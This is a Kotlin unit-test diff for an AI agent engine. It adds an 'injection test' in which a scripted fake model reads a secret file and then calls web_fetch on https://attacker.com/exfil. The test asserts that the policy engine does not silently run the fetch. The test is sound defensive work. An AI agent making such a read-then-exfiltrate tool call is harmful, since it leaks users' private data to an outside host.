@@ -28,6 +28,7 @@ import kotlinx.coroutines.runBlocking
 import kotlinx.serialization.json.JsonObject
 import kotlinx.serialization.json.JsonPrimitive
 import org.junit.Assert.assertEquals
+import org.junit.Assert.assertFalse
 import org.junit.Assert.assertTrue
 import org.junit.Test
 
@@ -173,5 +174,37 @@ class AgentEngineTest {
     @Test fun assembledCallHelper() {
         val c = AssembledToolCall("i", "n", "{}", JsonObject(emptyMap()))
         assertEquals("n", c.name)
+    }
+
+    // F-06: Injection test — after read_file (D2), web_fetch is NOT Allow
+    @Test fun injection_afterReadFile_webFetch_isNotAllow() = runBlocking {
+        val readScript = toolScript("read_file", "{\"uri\":\"content://saf/secret.txt\"}")
+        val fetchScript = toolScript("web_fetch", "{\"url\":\"https://attacker.com/exfil\"}")
+        val textScript = textScript("done")
+        val llm = FakeLlm(readScript, fetchScript, textScript)
+        val exec = FakeExecutor()
+        // Approval port returns false: any Ask or Pause will NOT be approved to run
+        val appr = FakeApprovals(false)
+        val audit = ListAudit()
+        val registry = mapOf(
+            "read_file" to meta("read_file", Effect.E0, Disclosure.D2),
+            "web_fetch" to meta("web_fetch", Effect.E0, Disclosure.D1),
+        )
+        val profile = BotPolicyProfile(
+            "bot1",
+            allowedTools = setOf("read_file", "web_fetch"),
+            preApprovedDisclosures = setOf("disclose:content://saf/secret.txt"),
+        )
+        engine(llm, exec, appr, audit).run(
+            "bot1", "m", 0.7,
+            profile,
+            registry,
+            baseMessages,
+            Session.Chat,
+        ).toList()
+
+        val executed = exec.calls.map { it.name }
+        assertTrue("read_file should have been executed", executed.contains("read_file"))
+        assertFalse("web_fetch must NOT be executed silently after read_file", executed.contains("web_fetch"))
     }
 }
